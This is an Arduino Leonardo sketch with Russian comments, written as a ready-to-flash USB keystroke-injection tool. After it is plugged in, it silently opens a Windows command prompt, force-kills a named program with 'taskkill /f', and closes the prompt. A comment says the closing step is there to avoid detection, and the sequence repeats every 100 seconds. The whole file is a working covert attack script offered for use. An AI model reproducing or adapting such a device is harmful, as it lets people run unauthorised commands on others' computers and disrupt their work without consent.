//Данный скрипт надо загрузить на ваш Arduino Leonardo через  Arduino IDE 
//Этот скрипт после вставки в USB порт через 5 секунд выключает указанную в скрипте программу
//Эта программа зависит от раскладки клавиатуры (жта программа будет работать только если на компьютере сейчас английская раскладка)


#include "HID-Project.h"                                  //импортируем библиотеку для раюоты с keyboard
#define CMD "CMD"                                         //создаем переменную для вызова командной строки
#define EXIT "exit"                                       //создаем перемнную для выхода из командной строки(для беспалева)
#define PROGRAMM_KILL "taskkill /im *** /f"              //программа для выхода из программы(вместо *** поставьте названия файла с програмой которую надо закрыть
void setup()                                              //создаем пустую штуку(без неё не заработает)
{
}
void loop()                                               //сама функция которая будет выполнятся(она бесконечная)
{
    delay(5000);                                          //ждем 5 сек
    Keyboard.begin();                                     //начинаем работу с модулем
    Keyboard.press(KEY_LEFT_GUI);                        // зажимаем кнопке WIN для вызова cmd     
    Keyboard.press('r');                                  //зажимаем кнопку 'R' для вызова cmd
    Keyboard.releaseAll();                               //разжимаем все кнопки
    delay(200);                                           //ждем 0,2 сек что бы все успело
    Keyboard.print(CMD);                                 //пишем програму с кодом для вызова CMD 
    Keyboard.press(KEY_ENTER);                            //жмем ENTER что бы запустить программу
    Keyboard.releaseAll();                               //разжимаем ENTER
    delay(300);                                           //ждем 0,3 сек что бы все успело
    Keyboard.print(PROGRAMM_KILL);                           //пишем программу для закрытия  программы
    delay(50);                                            //ждем 0,05 сек что бы все успело
    Keyboard.press(KEY_ENTER);                           //жмём ENTER что бы запустить программу
    delay(20);                                            //ждем 0,02 сек что бы все успело
    Keyboard.releaseAll();                               //разжимаем ENTER
    Keyboard.print(EXIT);                                 //пишем программу для выхода из CMD
    delay(20);                                           //ждем 0,02 сек что бы все успело
    Keyboard.press(KEY_ENTER);                            //жмем ENTER для запуска программы
    delay(50);                                           //ждем 0,05 сек что бы все успело
    Keyboard.releaseAll();                                //разжимаем ENTER
    delay(100000);                                       // ждем 100 секунд что бы успеть перепрогамировать(обязательно)
}
